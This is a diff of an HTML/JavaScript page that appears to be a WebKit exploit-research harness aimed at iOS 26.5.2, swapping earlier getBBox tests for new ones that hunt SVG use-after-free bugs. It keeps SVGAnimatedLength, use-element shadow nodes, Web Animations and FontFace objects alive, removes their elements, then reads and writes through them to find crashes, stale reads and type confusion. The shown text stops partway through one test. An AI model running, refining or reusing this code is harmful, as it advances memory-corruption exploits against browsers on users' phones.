@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG RO primitive isolation v17 · getBBox stale cache vs UAF · iOS 26.5.2</title>
+<title>SVG UAF v18 · ultimate async · AnimatedLength + UseInstance + WebAnim + FontFace · iOS 26.5.2</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
-h2{color:#ff4141;font-size:11px;letter-spacing:1px}
+h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
 .sub{color:#555;font-size:10px;margin-bottom:8px}
 #controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
 button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
@@ -18,20 +18,22 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG RO primitive isolation v17 · cache vs UAF vs deferred-destroy · iOS 26.5.2</h2>
+<h2>SVG UAF v18 · ultimate async paths · iOS 26.5.2 A16 arm64e</h2>
 <div class="sub">
-  v15: entry.target.getBBox()=80 inside RO callback AFTER remove() — 20/20
-  v16: crW=80 stale in DBL; loop guard killed 2nd callback in WIN/SPR/TYP/MOV
-  v17: isolate whether 80 = JS-cache, stale RenderObj ptr, or deferred destroy
-  key test: resize to W=123 before callback — does getBBox return 80 or 123 after remove?
+  v17 CONFIRMED: getBBox=0 outside RO, v15 was false positive (observed elem never removed)
+  v18: 4 genuine async C++ lifetime paths
+  AL: SVGAnimatedLength — C++ attr object outlives element removal
+  UI: SVGUseElement instance tree — shadow instance nodes deferred cleanup
+  WA: Web Animations API — Animation effect.target ptr survives element removal
+  FF: FontFace async load — font load callback fires after SVG text element removed
+  Each test: JS object holds C++ ptr → element freed → JS object reads freed ptr
 </div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runCAC()">CAC baseline cache</button>
-  <button onclick="runDEL()">DEL delta resize</button>
-  <button onclick="runDEF()">DEF deferred read</button>
-  <button onclick="runROI()">ROI ro-isolated repro</button>
-  <button onclick="runSEQ()">SEQ sequential read</button>
+  <button onclick="runAL()">AL svg-animated-length</button>
+  <button onclick="runUI()">UI use-instance-tree</button>
+  <button onclick="runWA()">WA web-animations</button>
+  <button onclick="runFF()">FF font-face-load</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -39,85 +41,78 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * QUESTION: what is the v15 getBBox()=80 after remove() actually reading?
+ * v17 FINDINGS (decisive):
+ *   CAC: getBBox=0 outside RO → no JS cache
+ *   DEL: getBBox=0 after remove inside RO callback → no window
+ *   SEQ: a=80 b=0 → remove() clears synchronously even inside RO
+ *   v15 tgtBBW=80 was FALSE POSITIVE — entry.target was the observed
+ *        rect which was NEVER removed; only sym1/useEl were removed
  *
- * THREE HYPOTHESES:
+ * TRUE ASYNC C++ LIFETIME PATHS:
  *
- * H1: JS-SIDE CACHE
- *   WebKit caches the last computed bbox on the JS SVGElement wrapper object
- *   After remove(), getBBox() returns the cached value from last layout
- *   This is NOT a UAF — it's a benign JS object property
- *   FALSIFY: resize element to W=123 before remove → if getBBox returns 80, it's stale ptr
- *            if getBBox returns 123, it's a JS cache (returns latest known value)
- *   ALSO: test getBBox() on removed element OUTSIDE any RO → should return same value if H1
+ * AL — SVGAnimatedLength:
+ *   SVG attributes like cx/cy/r/width/height expose SVGAnimatedLength objects
+ *   These are SEPARATE C++ objects from the element itself
+ *   They hold a back-ptr to their owner SVGElement (m_contextElement)
+ *   Pattern:
+ *     const animLen = rect.width;  // grab SVGAnimatedLength — separate C++ obj
+ *     rect.remove();               // element freed → m_contextElement now dangling
+ *     animLen.baseVal.value = 999; // writes through dangling ptr → UAF WRITE
+ *     animLen.animVal.value;       // reads through dangling ptr → UAF READ
+ *   Also: SVGAnimatedRect (viewBox), SVGAnimatedString (href)
+ *   Also: SVGLength (individual baseVal/animVal objects)
+ *   Also: SVGPoint, SVGMatrix from SVGGraphicsElement.getCTM()
  *
- * H2: STALE RENDEROBJECT POINTER (UAF)
- *   WebKit's RO delivery holds a reference to the element's RenderObject
- *   remove() is called but RenderObject not freed until RO delivery completes
- *   getBBox() dereferences the live (but freed-in-concept) RenderObject
- *   This is a true UAF window — the RO delivery phase protects the RenderObject
- *   FALSIFY: if we can READ through the ptr AND the value matches layout state
- *            (not a JS cache), it's H2
- *   CONFIRM: resize to 123 → remove → getBBox inside RO callback → returns 123?
- *            (ptr is live, returns current render state = true stale ptr read)
+ * UI — SVGUseElement instance tree:
+ *   <use href="#sym"> creates SVGElementInstance nodes in a shadow tree
+ *   These instances are SEPARATE C++ SVGElementInstance objects
+ *   They hold ptrs back to their corresponding element in the real tree
+ *   Pattern:
+ *     const inst = use.getSVGDocument?.() || use.contentDocument
+ *     Actually: use.instanceRoot → SVGElementInstance (deprecated but may exist)
+ *     OR: walk use's shadow DOM (open or closed?)
+ *     OR: SVGAnimateElement.targetElement on an animate targeting the use
+ *     When sym (the use target) is removed:
+ *       instance tree nodes may hold stale ptrs to freed sym children
+ *   Also: grabbing children of use's shadow root before removal
+ *   Also: SVGUseElement.correspondingElement on instance nodes
  *
- * H3: DEFERRED DESTROY (WebKit intentionally defers during RO delivery)
- *   WebKit explicitly defers RenderObject destruction during RO callback
- *   This is BY DESIGN — a feature, not a bug
- *   The RenderObject IS still alive (ref-counted, not freed)
- *   getBBox() returns valid data because the object is genuinely alive
- *   NOT a UAF — just an intentional deferral
- *   FALSIFY: if we can force the RenderObject to be freed BEFORE the callback
- *            and the read still returns 80 → H2 (not H3, H3 would return 0)
+ * WA — Web Animations API:
+ *   element.animate([...], options) returns an Animation object
+ *   Animation holds an AnimationEffect which holds a target element ptr
+ *   Pattern:
+ *     const anim = rect.animate([{width:'80px'},{width:'40px'}], {duration:1000})
+ *     rect.remove();         // element freed
+ *     anim.effect.target;    // → should be rect (JS strong ref) but
+ *     anim.currentTime = 500;// → tries to apply effect to freed render obj
+ *     anim.commitStyles();   // → force style resolution on freed element
+ *     anim.pause(); anim.play(); // → state machine transitions on freed target
+ *   Key: getComputedTiming(), getKeyframeFlattenedOffsets() — read effect state
+ *   Also: finish(), reverse(), updatePlaybackRate() after element removed
+ *   Also: AnimationEvent firing (onfinish, oncancel) after element removed
  *
- * TESTS:
+ * FF — FontFace async load:
+ *   document.fonts.load() is async — callback fires after layout/decode
+ *   SVG text with a custom font: when font loads, WebKit tries to reflow the text
+ *   If the text element was removed before the font load callback:
+ *     the reflow callback may access freed RenderObject for the text
+ *   Pattern:
+ *     const face = new FontFace('TestFont', 'url(data:...)')
+ *     document.fonts.add(face)
+ *     const text = createSVGText('TestFont')
+ *     livesvg.appendChild(text)  // triggers font load
+ *     text.remove()              // element freed
+ *     await face.load()          // font load completes → reflow of removed text?
+ *   Also: face.loaded promise resolve fires with text already removed
+ *   Also: document.fonts.ready — fires after all pending font loads
+ *   Also: FontFaceSetLoadEvent on document.fonts — fires async
+ *   Note: using a data URI font so load is "immediate" but still async
  *
- * CAC (cache baseline):
- *   getBBox() on removed rect OUTSIDE any RO context
- *   Immediately after remove(), in same sync block
- *   Also: after raf(), after tick() — does value decay?
- *   Also: after modifying attribute while removed — does value update?
- *   If getBBox returns 80 outside RO = JS cache exists regardless of RO
- *
- * DEL (delta resize — key test):
- *   1. Create rect W=80 → lay out → RO.observe
- *   2. Inside RO callback phase 1: resize rect to W=123 (triggers re-layout)
- *   3. Inside same callback: remove rect immediately after resize
- *   4. Read getBBox() inside same RO callback
- *   Result A: returns 80 → stale ptr to PRE-resize RenderObject (H2, old ptr)
- *   Result B: returns 123 → live ptr or JS cache (current value, H2 or H3)
- *   Result C: returns 0 → cleaned up before read (no UAF)
- *   This is the KEY test. 80 vs 123 tells us if the ptr is stale to OLD layout.
- *
- * DEF (deferred read timing):
- *   Inside RO callback: remove rect → then read getBBox at multiple timing points:
- *     - sync (same callback tick)
- *     - queueMicrotask
- *     - setTimeout(0)
- *     - requestAnimationFrame
- *   If sync=80, microtask=80, setTimeout=0 → RO delivery phase protects RenderObject
- *   If sync=80, microtask=0 → protection ends at microtask boundary
- *   Tells us exactly HOW LONG the window is open
- *
- * ROI (RO isolated repro):
- *   Exact reproduction of v15 tgtBBW=80 scenario
- *   Single callback, remove inside, read immediately
- *   Confirm the primitive is stable, measure exact conditions
- *   Also: try with different element sizes (20, 40, 60, 80, 100, 120)
- *   If all return their W → RO callback preserves layout state regardless of size
- *
- * SEQ (sequential mutations inside callback):
- *   Inside RO callback:
- *   a. getBBox() → should be 80 (element alive)
- *   b. remove()
- *   c. getBBox() → 80? (H2/H3) or 0? (H1 wouldn't know to return 0)
- *   d. setAttribute width=999 (mutate while removed)
- *   e. getBBox() → 80? 999? 0?
- *   f. re-insert into DOM
- *   g. getBBox() → new layout value?
- *   h. remove() again
- *   i. getBBox() → stale from (f)?
- *   Full lifecycle trace to understand exact behavior at each step
+ * WHAT TO LOOK FOR:
+ *   crash     = memory access violation on freed object = confirmed UAF
+ *   stale val = reading value that reflects freed object state
+ *   wrong tag = type confusion after free
+ *   hang      = infinite loop inside freed object vtable dispatch
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -127,395 +122,533 @@ function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.te
 const sep=()=>log('─'.repeat(52),'sep');
 const raf=()=>new Promise(r=>requestAnimationFrame(r));
 const tick=()=>new Promise(r=>setTimeout(r,0));
+const micro=()=>new Promise(r=>queueMicrotask(r));
 function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){const a=document.createElement('textarea');a.value=Lel.innerText;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
 function clearLog(){Lel.innerHTML='';}
 function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.toString().match(/copy|clear/i))b.disabled=d;});}
-window.onerror=(m,_,l,c)=>{log(`[ERR] ${m} L${l}:${c}`,'bad');return false;};
+window.onerror=(m,_,l,c,err)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
 window.onunhandledrejection=e=>{log(`[REJ] ${e.reason}`,'bad');};
 
-function mkRect(id,w,h){
-    const r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('id',id||'r');
-    r.setAttribute('x','5');r.setAttribute('y','5');
-    r.setAttribute('width',String(w||80));r.setAttribute('height',String(h||80));
-    r.setAttribute('fill','blue');
-    return r;
-}
+function f2h32(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
 
-// ── CAC: baseline cache — getBBox on removed element outside RO ──────────
-async function runCAC(q=false){
-    if(!q){dis(true);sep();log('▶ CAC: getBBox on removed element — outside RO context','inf');sep();}
-    log('[*] does WebKit cache last bbox on SVGElement JS wrapper?','inf');
-    log('[*] tests: immediate, after raf, after tick, after attribute mutate','ok');
-    log('[*] if 80 outside RO context → JS cache (not RO-specific behavior)','ok');log('');
+// ── AL: SVGAnimatedLength / SVGAnimatedRect / SVGPoint / CTM ─────────────
+async function runAL(q=false){
+    if(!q){dis(true);sep();log('▶ AL: SVGAnimatedLength — grab animated attr obj, free element, read/write attr','inf');sep();}
+    log('[*] SVGAnimatedLength holds m_contextElement ptr → dangling after remove()','inf');
+    log('[*] test: rect.width (SVGAnimatedLength) → remove → animLen.baseVal.value','ok');
+    log('[*] also: viewBox (SVGAnimatedRect), getCTM (SVGMatrix), getScreenCTM','ok');
+    log('[*] also: SVGPoint from createSVGPoint(), SVGLength from baseVal','bad');log('');
 
-    const results=[];
-    for(let t=0;t<12;t++){
+    let crash=0,stale=0,normal=0;
+    const staleVals=[];
+
+    for(let t=0;t<24;t++){
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();await raf();
 
-        const r=mkRect(`cac_${t}`,80,80);
-        livesvg.appendChild(r);
-        await raf();await raf();
-
-        // Baseline before remove
-        let base=null;try{base=r.getBBox().width;}catch(e){}
-
-        // SYNC remove + immediate getBBox
-        r.remove();
-        let syncW=null;try{syncW=r.getBBox().width;}catch(e){}
-
-        // Mutate while removed — does cached value update?
-        r.setAttribute('width','123');
-        let mutW=null;try{mutW=r.getBBox().width;}catch(e){}
-
-        // Re-insert, force layout, then remove again
-        livesvg.appendChild(r);
+        const rect=document.createElementNS(SVG_NS,'rect');
+        rect.setAttribute('x','10');rect.setAttribute('y','10');
+        rect.setAttribute('width','80');rect.setAttribute('height','60');
+        rect.setAttribute('rx','5');
+        livesvg.appendChild(rect);
         await raf();
-        let relayoutW=null;try{relayoutW=r.getBBox().width;}catch(e){}
-        r.remove();
-        let postRelayoutW=null;try{postRelayoutW=r.getBBox().width;}catch(e){}
 
-        // After raf — does value change?
-        await raf();
-        let rafW=null;try{rafW=r.getBBox().width;}catch(e){}
+        // Grab every SVGAnimated* object BEFORE remove
+        let animW,animH,animX,animY,animRx;
+        let baseValW,baseValH; // SVGLength objects (children of SVGAnimatedLength)
+        let ctm,screenCtm;    // SVGMatrix objects
+        let bbox;             // SVGRect
+        let pt;               // SVGPoint
 
-        // After tick
-        await tick();
-        let tickW=null;try{tickW=r.getBBox().width;}catch(e){}
+        try{animW=rect.width;}catch(e){}           // SVGAnimatedLength
+        try{animH=rect.height;}catch(e){}
+        try{animX=rect.x;}catch(e){}
+        try{animY=rect.y;}catch(e){}
+        try{animRx=rect.rx;}catch(e){}
+        try{baseValW=rect.width?.baseVal;}catch(e){}  // SVGLength
+        try{baseValH=rect.height?.baseVal;}catch(e){}
+        try{ctm=rect.getCTM?.();}catch(e){}           // SVGMatrix (snapshot — probably safe)
+        try{screenCtm=rect.getScreenCTM?.();}catch(e){}
+        try{bbox=rect.getBBox?.();}catch(e){}         // SVGRect (snapshot)
+        try{
+            const svg=rect.ownerSVGElement||livesvg;
+            pt=svg.createSVGPoint?.();
+            if(pt){pt.x=50;pt.y=50;}
+        }catch(e){}
 
-        const res={base,syncW,mutW,relayoutW,postRelayoutW,rafW,tickW};
-        results.push(res);
+        const preW=baseValW?.value;
 
-        // KEY: is syncW=80 (old layout) or 0 (no cache) or something else?
-        const interesting=syncW!==0||mutW!==0||postRelayoutW!==0;
-        log(`  t${t}: base=${base} sync=${syncW} mut(123)=${mutW} relayout=${relayoutW} postRelay=${postRelayoutW} raf=${rafW} tick=${tickW}`,(interesting?'bad':'dim'));
+        // ── FREE THE ELEMENT ──
+        rect.remove();
+        await micro(); // let microtasks run
+
+        // ── NOW READ/WRITE THROUGH RETAINED C++ OBJECTS ──
+        const reads={};
+
+        // SVGAnimatedLength reads (m_contextElement now dangling)
+        try{reads.animW_base=animW?.baseVal?.value;}catch(ex){reads.animW_base_crash=ex.message.slice(0,40);crash++;}
+        try{reads.animW_anim=animW?.animVal?.value;}catch(ex){reads.animW_anim_crash=ex.message.slice(0,40);crash++;}
+        try{reads.animH_base=animH?.baseVal?.value;}catch(ex){reads.animH_base_crash=ex.message.slice(0,40);crash++;}
+        try{reads.animX_base=animX?.baseVal?.value;}catch(ex){reads.animX_base_crash=ex.message.slice(0,40);crash++;}
+        try{reads.animRx_base=animRx?.baseVal?.value;}catch(ex){reads.animRx_base_crash=ex.message.slice(0,40);crash++;}
+
+        // SVGLength write — writing through dangling m_contextElement ptr
+        try{
+            const oldV=baseValW?.value;
+            baseValW.value=999; // WRITE through freed element's attr system
+            reads.writeResult=baseValW?.value; // did it write?
+            reads.writeOld=oldV;
+        }catch(ex){reads.write_crash=ex.message.slice(0,40);crash++;}
+
+        // SVGLength unit type (reads element's attr system)
+        try{reads.unitType=baseValW?.unitType;}catch(ex){reads.unitType_crash=ex.message.slice(0,40);crash++;}
+        try{reads.unitTypeH=baseValH?.unitType;}catch(ex){}
+
+        // SVGMatrix from getCTM — may hold ptr to element's renderer
+        // Re-get CTM after remove (fresh call on freed element)
+        let postCtm=null;
+        try{postCtm=rect.getCTM?.();}catch(ex){reads.ctm_crash=ex.message.slice(0,40);crash++;}
+        if(postCtm){reads.postCtmA=postCtm.a;reads.postCtmD=postCtm.d;}
+
+        // getBBox after remove (baseline — should be 0)
+        try{reads.postBBox=rect.getBBox?.().width;}catch(ex){reads.bbox_crash=ex.message.slice(0,40);crash++;}
+
+        // SVGPoint.matrixTransform with freed element's CTM
+        if(pt&&ctm){
+            try{const xpt=pt.matrixTransform(ctm);reads.ptX=xpt.x;reads.ptY=xpt.y;}catch(ex){crash++;}
+        }
+
+        // Is baseVal still reflecting the original 80 or our write of 999?
+        const isStale=(reads.animW_base!==undefined&&reads.animW_base!==0)||
+                      (reads.animW_anim!==undefined&&reads.animW_anim!==0)||
+                      (reads.writeResult!==undefined&&reads.writeResult!==0)||
+                      crash>0;
+
+        if(isStale){
+            stale++;
+            staleVals.push(reads);
+            log(`  t${t}: [STALE/CRASH] animW_base=${reads.animW_base} animVal=${reads.animW_anim} write=${reads.writeResult} unit=${reads.unitType} ctm_a=${reads.postCtmA} crash=${reads.animW_base_crash||reads.write_crash||reads.ctm_crash||''}`, 'bad');
+        }else{
+            normal++;
+            if(t<3)log(`  t${t}: animW_base=${reads.animW_base} animVal=${reads.animW_anim} write=${reads.writeResult} unit=${reads.unitType} postBBox=${reads.postBBox}`,'dim');
+        }
 
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();
     }
 
-    // Summarize
-    const syncNon0=results.filter(r=>r.syncW!==0).length;
-    const mutNon0=results.filter(r=>r.mutW!==0).length;
-    log(`\n[*] CAC: syncW≠0: ${syncNon0}/12, mutW≠0: ${mutNon0}/12`,(syncNon0>0?'bad':'inf'));
-    if(syncNon0>0)log(`[!] getBBox OUTSIDE RO returns stale value — JS cache confirmed`,'inf');
-    else log(`[+] getBBox returns 0 outside RO — v15 value of 80 is RO-SPECIFIC`,'bad');
-
+    log(`\n[*] AL: stale=${stale} normal=${normal} crash=${crash}`,(stale>0||crash>0?'bad':'inf'));
+    if(stale>0){
+        log(`[+] SVGAnimatedLength reads freed element state!`,'bad');
+        staleVals.slice(0,3).forEach(v=>log(`  animW_base=${v.animW_base} write=${v.writeResult} unit=${v.unitType}`,'bad'));
+    }
     if(!q)dis(false);
-    return{syncNon0,mutNon0,results};
+    return{stale,normal,crash};
 }
 
-// ── DEL: delta resize — key test to distinguish H1/H2/H3 ─────────────────
-async function runDEL(q=false){
-    if(!q){dis(true);sep();log('▶ DEL: resize to W=123 inside RO callback THEN remove → getBBox=80 or 123?','inf');sep();}
-    log('[*] H2(stale old ptr): returns 80 (ptr to pre-resize RenderObject)','ok');
-    log('[*] H3(deferred, live): returns 123 (live RO reflects new size)','ok');
-    log('[*] H1(JS cache): returns 123 (cache updated on setAttribute)','ok');
-    log('[*] 0 = no UAF, RO not protecting anything','ok');log('');
+// ── UI: SVGUseElement instance tree ──────────────────────────────────────
+async function runUI(q=false){
+    if(!q){dis(true);sep();log('▶ UI: SVGUseElement instance tree — shadow nodes hold ptrs to freed target','inf');sep();}
+    log('[*] use element creates SVGElementInstance shadow tree','inf');
+    log('[*] grab shadow DOM refs before sym removal → remove sym → read instances','ok');
+    log('[*] also: animate.targetElement on animate inside use shadow','ok');
+    log('[*] also: correspondingElement / correspondingUseElement on instances','bad');log('');
 
-    let got80=0,got123=0,got0=0,gotOther=0;
-    const vals=[];
+    let crash=0,stale=0,normal=0;
 
     for(let t=0;t<20;t++){
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();await raf();
 
-        const r=mkRect(`del_${t}`,80,80);
-        livesvg.appendChild(r);
+        const sym=document.createElementNS(SVG_NS,'symbol');
+        sym.setAttribute('id',`ui_sym_${t}`);
+        sym.setAttribute('viewBox','0 0 100 100');
+        const innerRect=document.createElementNS(SVG_NS,'rect');
+        innerRect.setAttribute('width','80');innerRect.setAttribute('height','80');
+        innerRect.setAttribute('fill','blue');
+        sym.appendChild(innerRect);
+
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#ui_sym_${t}`);
+        livesvg.appendChild(sym);
+        livesvg.appendChild(useEl);
         await raf();await raf();
 
-        await new Promise(resolve=>{
-            let resolved=false,phase=0;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,400);
+        const reads={};
 
-            const ro=new ResizeObserver(()=>{
-                phase++;
-                if(phase>1){ro.disconnect();safeResolve();return;}
+        // Try to get the shadow root of the use element
+        let shadowRoot=null;
+        try{shadowRoot=useEl.shadowRoot;}catch(e){}
+        // Some WebKit builds expose instance tree via shadowRoot
 
-                // Phase 1: resize first (forces re-layout queued inside RO)
-                r.setAttribute('width','123');
-                // Flush layout synchronously (getBBox forces layout)
-                let afterResize=null;
-                try{afterResize=r.getBBox().width;}catch(e){}
+        // Deprecated but may exist: instanceRoot
+        let instanceRoot=null;
+        try{instanceRoot=useEl.instanceRoot;}catch(e){}
 
-                // NOW remove
-                try{r.remove();}catch(e){}
-
-                // Read immediately after remove, still inside RO callback
-                let postRemoveW=null;
-                try{postRemoveW=r.getBBox().width;}catch(e){}
-
-                // Read bounding client rect — different code path
-                let bcW=null;
-                try{bcW=r.getBoundingClientRect().width;}catch(e){}
-
-                // Read contentRect from entry (if available via closure)
-                vals.push({t,afterResize,postRemoveW,bcW});
-
-                if(postRemoveW===80){got80++;log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW} → [80=STALE OLD PTR]`,'bad');}
-                else if(postRemoveW===123){got123++;log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW} → [123=LIVE/CACHE]`,'inf');}
-                else if(postRemoveW===0){got0++;if(t<4)log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW}`,'dim');}
-                else{gotOther++;log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW} → [OTHER=${postRemoveW}]`,'bad');}
-
-                ro.disconnect();safeResolve();
-            });
-            try{ro.observe(r);}catch(ex){safeResolve();}
-        });
-
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();
-    }
-
-    log(`\n[*] DEL: got80=${got80} got123=${got123} got0=${got0} other=${gotOther}`);
-    if(got80>0)log(`[!!] 80 RETURNED = STALE RENDEROBJECT PTR — pre-resize geometry = true UAF read`,'bad');
-    if(got123>0)log(`[*] 123 returned = live RO or JS cache (deferred destroy or benign)`,'inf');
-    if(got0===20)log(`[*] all 0 = no data survives remove inside RO callback`,'dim');
-
-    if(!q)dis(false);
-    return{got80,got123,got0,gotOther};
-}
-
-// ── DEF: how long is the window — sync vs micro vs tick vs raf ───────────
-async function runDEF(q=false){
-    if(!q){dis(true);sep();log('▶ DEF: timing of getBBox after remove inside RO — how long is window?','inf');sep();}
-    log('[*] inside RO callback: remove then read at: sync / microtask / tick / raf','inf');
-    log('[*] where does the value go from 80 to 0? = window boundary','ok');log('');
-
-    const timings={sync:[],micro:[],tick:[],raf:[]};
-
-    for(let t=0;t<12;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();await raf();
-
-        const r=mkRect(`def_${t}`,80,80);
-        livesvg.appendChild(r);
-        await raf();await raf();
-
-        const reads={sync:null,micro:null,tick:null,raf:null};
-
-        await new Promise(resolve=>{
-            let resolved=false,phase=0;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,600);
-
-            const ro=new ResizeObserver(()=>{
-                phase++;
-                if(phase>1){ro.disconnect();safeResolve();return;}
-
-                r.remove();
-
-                // SYNC — same callback tick
-                try{reads.sync=r.getBBox().width;}catch(e){reads.sync='ERR';}
-
-                // MICROTASK — next microtask
-                queueMicrotask(()=>{
-                    try{reads.micro=r.getBBox().width;}catch(e){reads.micro='ERR';}
-                });
-
-                // TICK — setTimeout(0)
-                setTimeout(()=>{
-                    try{reads.tick=r.getBBox().width;}catch(e){reads.tick='ERR';}
-                },0);
-
-                // RAF — next animation frame
-                requestAnimationFrame(()=>{
-                    try{reads.raf=r.getBBox().width;}catch(e){reads.raf='ERR';}
-                    // All reads done
-                    Object.keys(timings).forEach(k=>timings[k].push(reads[k]));
-                    log(`  t${t}: sync=${reads.sync} micro=${reads.micro} tick=${reads.tick} raf=${reads.raf}`,
-                        (reads.sync!==0||reads.micro!==0?'bad':'dim'));
-                    ro.disconnect();safeResolve();
-                });
-            });
-            try{ro.observe(r);}catch(ex){safeResolve();}
-        });
-
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();
-    }
-
-    // Summarize window
-    const syncNon0=timings.sync.filter(v=>v!==0&&v!==null).length;
-    const microNon0=timings.micro.filter(v=>v!==0&&v!==null).length;
-    const tickNon0=timings.tick.filter(v=>v!==0&&v!==null).length;
-    const rafNon0=timings.raf.filter(v=>v!==0&&v!==null).length;
-    log(`\n[*] DEF window: sync=${syncNon0}/12 micro=${microNon0}/12 tick=${tickNon0}/12 raf=${rafNon0}/12`);
-    if(syncNon0>0&&microNon0===0)log(`[*] window = sync only (same RO callback tick)`,'inf');
-    if(syncNon0>0&&microNon0>0&&tickNon0===0)log(`[*] window = sync + microtask (RO delivery phase)`,'bad');
-    if(tickNon0>0)log(`[*] window extends past setTimeout — RO defers beyond event loop turn`,'bad');
-
-    if(!q)dis(false);
-    return{syncNon0,microNon0,tickNon0,rafNon0};
-}
-
-// ── ROI: isolated repro of v15 — confirm primitive is stable ─────────────
-async function runROI(q=false){
-    if(!q){dis(true);sep();log('▶ ROI: exact v15 repro — vary element sizes, confirm 100% repro','inf');sep();}
-    log('[*] remove inside RO callback → read entry.target.getBBox()','inf');
-    log('[*] vary W: 20,40,60,80,100,120 — does returned value match W?','ok');
-    log('[*] if yes → reading current RenderObject layout state (H2 or H3)','ok');log('');
-
-    const WIDTHS=[20,40,60,80,100,120];
-    const byWidth={};
-
-    for(const W of WIDTHS){
-        byWidth[W]={hit:0,miss:0,vals:[]};
-        for(let t=0;t<8;t++){
-            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-            await raf();await raf();
-
-            const r=mkRect(`roi_${W}_${t}`,W,W);
-            livesvg.appendChild(r);
-            await raf();await raf();
-
-            await new Promise(resolve=>{
-                let resolved=false,phase=0;
-                const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-                setTimeout(safeResolve,400);
-
-                const ro=new ResizeObserver((entries)=>{
-                    phase++;
-                    if(phase>1){ro.disconnect();safeResolve();return;}
-                    const entry=entries[0];
-
-                    // Remove inside callback
-                    try{r.remove();}catch(e){}
-
-                    let tgtW=null;
-                    try{tgtW=entry.target.getBBox().width;}catch(e){}
-                    let crW=null;
-                    try{crW=entry.contentRect?.width;}catch(e){}
-
-                    byWidth[W].vals.push(tgtW);
-                    if(tgtW===W){byWidth[W].hit++;}else{byWidth[W].miss++;}
-
-                    ro.disconnect();safeResolve();
-                });
-                try{ro.observe(r);}catch(ex){safeResolve();}
-            });
-
-            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-            await raf();
+        // If shadow root accessible, grab children before removal
+        let shadowChild=null,shadowChildTag=null;
+        if(shadowRoot){
+            try{shadowChild=shadowRoot.firstChild;shadowChildTag=shadowChild?.tagName;}catch(e){}
         }
-        const bw=byWidth[W];
-        log(`  W=${W}: hit=${bw.hit}/8 miss=${bw.miss}/8 vals=[${[...new Set(bw.vals)].join(',')}]`,(bw.hit>0?'bad':'dim'));
-    }
 
-    const totalHit=Object.values(byWidth).reduce((s,v)=>s+v.hit,0);
-    log(`\n[*] ROI: total hit=${totalHit}/${WIDTHS.length*8}`,(totalHit>0?'bad':'inf'));
-    if(totalHit===WIDTHS.length*8)log(`[+] 100% repro — RO callback preserves layout geometry for ALL sizes`,'bad');
+        // Grab the animate targetElement path
+        const anim=document.createElementNS(SVG_NS,'animate');
+        anim.setAttribute('attributeName','width');
+        anim.setAttribute('values','80;40;80');
+        anim.setAttribute('dur','0.1s');
+        anim.setAttribute('repeatCount','indefinite');
+        innerRect.appendChild(anim);
+        await raf();
 
-    if(!q)dis(false);
-    return{byWidth,totalHit};
-}
+        let preTarget=null;
+        try{preTarget=anim.targetElement;}catch(e){}
 
-// ── SEQ: full lifecycle trace inside RO callback ──────────────────────────
-async function runSEQ(q=false){
-    if(!q){dis(true);sep();log('▶ SEQ: step-by-step getBBox trace inside RO callback','inf');sep();}
-    log('[*] a=before remove b=after remove c=after mutate(999) d=after reinsert e=after 2nd remove','inf');
-    log('[*] full lifecycle to understand each state transition','ok');log('');
+        // Grab any accessible instance nodes
+        reads.preTarget=preTarget?.tagName;
+        reads.shadowRoot=!!shadowRoot;
+        reads.instanceRoot=!!instanceRoot;
+        reads.shadowChildTag=shadowChildTag;
 
-    const seqResults=[];
-    for(let t=0;t<12;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();await raf();
+        // ── FREE THE SYMBOL ──
+        sym.remove();
+        await micro();
 
-        const r=mkRect(`seq_${t}`,80,80);
-        livesvg.appendChild(r);
-        await raf();await raf();
+        // ── READ INSTANCE TREE STATE AFTER FREE ──
 
-        await new Promise(resolve=>{
-            let resolved=false,phase=0;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,400);
+        // Does animate.targetElement still return something valid?
+        let postTarget=null,postTargetTag='?';
+        try{postTarget=anim.targetElement;postTargetTag=postTarget?.tagName||'null';}catch(ex){reads.target_crash=ex.message.slice(0,40);crash++;}
+        reads.postTargetTag=postTargetTag;
 
